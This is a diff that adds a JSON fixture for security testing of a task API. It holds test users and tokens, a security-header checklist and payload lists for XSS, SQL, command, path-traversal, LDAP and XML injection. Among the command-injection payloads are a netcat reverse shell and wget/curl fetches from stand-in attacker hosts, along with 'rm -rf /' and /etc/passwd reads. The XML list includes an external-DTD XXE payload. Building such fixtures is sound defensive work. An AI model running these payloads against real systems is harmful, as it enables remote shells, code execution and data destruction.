@@ -1,0 +1,404 @@
+{
+  "testUsers": {
+    "admin": {
+      "userId": "test-admin-001",
+      "email": "admin@test.example.com",
+      "roles": ["Admin"],
+      "groups": ["admin"],
+      "permissions": ["*"]
+    },
+    "contributor": {
+      "userId": "test-contributor-001",
+      "email": "contributor@test.example.com",
+      "roles": ["Contributor"],
+      "groups": ["contributor"],
+      "permissions": ["task:create", "task:read", "task:update"]
+    },
+    "viewer": {
+      "userId": "test-viewer-001",
+      "email": "viewer@test.example.com",
+      "roles": ["Viewer"],
+      "groups": ["viewer"],
+      "permissions": ["task:read"]
+    },
+    "malicious": {
+      "userId": "test-malicious-001",
+      "email": "malicious@test.example.com",
+      "roles": [],
+      "groups": [],
+      "permissions": []
+    }
+  },
+  "testData": {
+    "validTasks": [
+      {
+        "taskId": "test-task-001",
+        "title": "Test Task 1",
+        "description": "A valid test task for security testing",
+        "assignedTo": "test-contributor-001",
+        "createdBy": "test-admin-001",
+        "status": "pending",
+        "priority": "medium",
+        "deadline": "2024-12-31T23:59:59.999Z",
+        "tags": ["test", "security"]
+      },
+      {
+        "taskId": "test-task-002",
+        "title": "Test Task 2",
+        "description": "Another valid test task",
+        "assignedTo": "test-viewer-001",
+        "createdBy": "test-contributor-001",
+        "status": "in-progress",
+        "priority": "high",
+        "deadline": "2024-11-30T23:59:59.999Z",
+        "tags": ["test"]
+      }
+    ],
+    "maliciousPayloads": {
+      "xss": [
+        "<script>alert('xss')</script>",
+        "javascript:alert('xss')",
+        "<img src=\"x\" onerror=\"alert(1)\">",
+        "<svg onload=\"alert(1)\">",
+        "\"><script>alert('xss')</script>",
+        "<iframe src=\"javascript:alert('xss')\"></iframe>",
+        "<body onload=\"alert('xss')\">",
+        "<input onfocus=\"alert('xss')\" autofocus>",
+        "<select onfocus=\"alert('xss')\" autofocus>",
+        "<textarea onfocus=\"alert('xss')\" autofocus>"
+      ],
+      "sqlInjection": [
+        "'; DROP TABLE users; --",
+        "1' OR '1'='1",
+        "admin'/*",
+        "1; DELETE FROM tasks WHERE 1=1; --",
+        "UNION SELECT * FROM users",
+        "' OR 1=1 --",
+        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
+        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
+        "' OR '1'='1' /*",
+        "1' UNION SELECT null, username, password FROM users --"
+      ],
+      "commandInjection": [
+        "; ls -la",
+        "| cat /etc/passwd",
+        "&& rm -rf /",
+        "`whoami`",
+        "$(id)",
+        "; curl malicious.com",
+        "| nc -e /bin/sh attacker.com 4444",
+        "&& wget http://malicious.com/shell.sh",
+        "; python -c \"import os; os.system('ls')\"",
+        "$(curl -s http://malicious.com/payload)"
+      ],
+      "pathTraversal": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+        "/var/www/../../etc/passwd",
+        "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
+        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "file:///etc/passwd"
+      ],
+      "ldapInjection": [
+        "*)(uid=*",
+        "*)(|(uid=*))",
+        "admin)(&(password=*))",
+        "*)(cn=*",
+        "*)(&(objectClass=*))",
+        "*)(mail=*@*",
+        "admin))(|(uid=*",
+        "*)(userPassword=*",
+        "*)(&(|(uid=admin)(uid=administrator)))",
+        "*)(description=*"
+      ],
+      "xmlInjection": [
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://malicious.com/evil.dtd\">%remote;]>",
+        "<![CDATA[<script>alert('xss')</script>]]>",
+        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>"
+      ]
+    },
+    "testTokens": {
+      "valid": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXVzZXItMDAxIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwiaWF0IjoxNjAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.test",
+      "expired": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXVzZXItMDAxIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwiaWF0IjoxNjAwMDAwMDAwLCJleHAiOjE2MDAwMDAwMDF9.test",
+      "malformed": "invalid.jwt.token",
+      "empty": "",
+      "adminToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LWFkbWluLTAwMSIsImVtYWlsIjoiYWRtaW5AdGVzdC5leGFtcGxlLmNvbSIsInJvbGVzIjpbIkFkbWluIl0sImlhdCI6MTYwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.test",
+      "contributorToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LWNvbnRyaWJ1dG9yLTAwMSIsImVtYWlsIjoiY29udHJpYnV0b3JAdGVzdC5leGFtcGxlLmNvbSIsInJvbGVzIjpbIkNvbnRyaWJ1dG9yIl0sImlhdCI6MTYwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.test",
+      "viewerToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXZpZXdlci0wMDEiLCJlbWFpbCI6InZpZXdlckB0ZXN0LmV4YW1wbGUuY29tIiwicm9sZXMiOlsiVmlld2VyIl0sImlhdCI6MTYwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.test"
+    }
+  },
+  "attackScenarios": {
+    "bruteForce": {
+      "maxAttempts": 5,
+      "lockoutDuration": 300000,
+      "testPasswords": [
+        "password",
+        "123456",
+        "admin",
+        "test",
+        "qwerty",
+        "password123",
+        "admin123",
+        "root",
+        "toor",
+        "guest"
+      ],
+      "testUsernames": [
+        "admin",
+        "administrator",
+        "root",
+        "user",
+        "test",
+        "guest",
+        "demo",
+        "sa",
+        "oracle",
+        "postgres"
+      ]
+    },
+    "rateLimiting": {
+      "maxRequestsPerMinute": 100,
+      "testDuration": 60000,
+      "burstSize": 10,
+      "windowSize": 60000
+    },
+    "sessionFixation": {
+      "testSessionIds": [
+        "session-1",
+        "session-2",
+        "session-3",
+        "fixed-session-id",
+        "predictable-session",
+        "12345678",
+        "abcdefgh",
+        "session-admin",
+        "test-session",
+        "default-session"
+      ]
+    },
+    "csrfAttack": {
+      "maliciousOrigins": [
+        "https://malicious.com",
+        "http://evil.example.com",
+        "https://attacker.net",
+        "http://localhost:8080",
+        "null",
+        "data:",
+        "file://",
+        "javascript:"
+      ],
+      "testActions": [
+        "DELETE /tasks/123",
+        "POST /tasks",
+        "PUT /tasks/123",
+        "POST /auth/logout",
+        "PUT /users/profile",
+        "DELETE /users/account"
+      ]
+    },
+    "clickjacking": {
+      "testFrameOptions": [
+        "ALLOW-FROM https://malicious.com",
+        "ALLOWALL",
+        "",
+        "SAMEORIGIN"
+      ],
+      "maliciousFrames": [
+        "<iframe src=\"https://api.example.com/admin\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;\"></iframe>",
+        "<frame src=\"https://api.example.com/delete-account\"></frame>"
+      ]
+    }
+  },
+  "testEnvironment": {
+    "baseUrl": "http://localhost:3000",
+    "apiUrl": "http://localhost:3001",
+    "timeout": 30000,
+    "retries": 3,
+    "parallel": false,
+    "verbose": true,
+    "screenshots": true,
+    "recordVideo": false
+  },
+  "securityHeaders": {
+    "required": [
+      "X-Frame-Options",
+      "X-Content-Type-Options",
+      "X-XSS-Protection",
+      "Strict-Transport-Security",
+      "Content-Security-Policy",
+      "Referrer-Policy",
+      "Permissions-Policy"
+    ],
+    "forbidden": [
+      "Server",
+      "X-Powered-By",
+      "X-AspNet-Version",
+      "X-AspNetMvc-Version"
+    ],
+    "expectedValues": {
+      "X-Frame-Options": ["DENY", "SAMEORIGIN"],
+      "X-Content-Type-Options": ["nosniff"],
+      "X-XSS-Protection": ["1; mode=block", "0"],
+      "Strict-Transport-Security": ["max-age=31536000; includeSubDomains"],
+      "Content-Security-Policy": ["default-src 'self'"],
+      "Referrer-Policy": ["strict-origin-when-cross-origin", "no-referrer"],
+      "Permissions-Policy": ["geolocation=(), microphone=(), camera=()"]
+    }
+  },
+  "complianceFrameworks": {
+    "owasp": {
+      "version": "2021",
+      "categories": [
+        "A01:2021-Broken Access Control",
+        "A02:2021-Cryptographic Failures",
+        "A03:2021-Injection",
+        "A04:2021-Insecure Design",
+        "A05:2021-Security Misconfiguration",
+        "A06:2021-Vulnerable and Outdated Components",
+        "A07:2021-Identification and Authentication Failures",
+        "A08:2021-Software and Data Integrity Failures",
+        "A09:2021-Security Logging and Monitoring Failures",
+        "A10:2021-Server-Side Request Forgery"
+      ]
+    },
+    "nist": {
+      "framework": "Cybersecurity Framework",
+      "functions": [
+        "Identify",
+        "Protect",
+        "Detect",
+        "Respond",
+        "Recover"
+      ]
+    },
+    "gdpr": {
+      "principles": [
+        "Lawfulness, fairness and transparency",
+        "Purpose limitation",
+        "Data minimisation",
+        "Accuracy",
+        "Storage limitation",
+        "Integrity and confidentiality",
+        "Accountability"
+      ]
+    }
+  },
+  "testCategories": {
+    "authentication": {
+      "enabled": true,
+      "tests": [
+        "password_policy",
+        "brute_force_protection",
+        "session_management",
+        "multi_factor_authentication",
+        "account_lockout"
+      ]
+    },
+    "authorization": {
+      "enabled": true,
+      "tests": [
+        "role_based_access_control",
+        "privilege_escalation",
+        "horizontal_access_control",
+        "resource_based_permissions",
+        "api_authorization"
+      ]
+    },
+    "inputValidation": {
+      "enabled": true,
+      "tests": [
+        "xss_prevention",
+        "sql_injection_prevention",
+        "command_injection_prevention",
+        "path_traversal_prevention",
+        "xml_injection_prevention",
+        "ldap_injection_prevention"
+      ]
+    },
+    "sessionManagement": {
+      "enabled": true,
+      "tests": [
+        "session_fixation",
+        "session_timeout",
+        "concurrent_sessions",
+        "session_token_entropy",
+        "secure_cookie_attributes"
+      ]
+    },
+    "cryptography": {
+      "enabled": true,
+      "tests": [
+        "encryption_at_rest",
+        "encryption_in_transit",
+        "key_management",
+        "hashing_algorithms",
+        "random_number_generation"
+      ]
+    },
+    "errorHandling": {
+      "enabled": true,
+      "tests": [
+        "information_disclosure",
+        "error_message_sanitization",
+        "stack_trace_exposure",
+        "debug_information_leakage"
+      ]
+    },
+    "logging": {
+      "enabled": true,
+      "tests": [
+        "security_event_logging",
+        "log_injection_prevention",
+        "sensitive_data_in_logs",
+        "log_integrity",
+        "monitoring_and_alerting"
+      ]
+    },
+    "networkSecurity": {
+      "enabled": true,
+      "tests": [
+        "cors_policy",
+        "security_headers",
+        "ssl_tls_configuration",
+        "rate_limiting",
+        "ddos_protection"
+      ]
+    },
+    "dataProtection": {
+      "enabled": true,
+      "tests": [
+        "data_classification",
+        "data_retention",
+        "data_deletion",
+        "privacy_controls",
+        "consent_management"
+      ]
+    },
+    "infrastructure": {
+      "enabled": true,
+      "tests": [
+        "aws_security_configuration",
+        "iam_policies",
+        "vpc_security",
+        "database_security",
+        "secrets_management"
+      ]
+    }
+  },
+  "reporting": {
+    "formats": ["json", "html", "csv", "markdown"],
+    "includeScreenshots": true,
+    "includeRecommendations": true,
+    "includeTrends": true,
+    "includeCompliance": true,
+    "outputDirectory": "./reports",
+    "historyDirectory": "./reports/history",
+    "maxHistoryReports": 10
+  }
+}
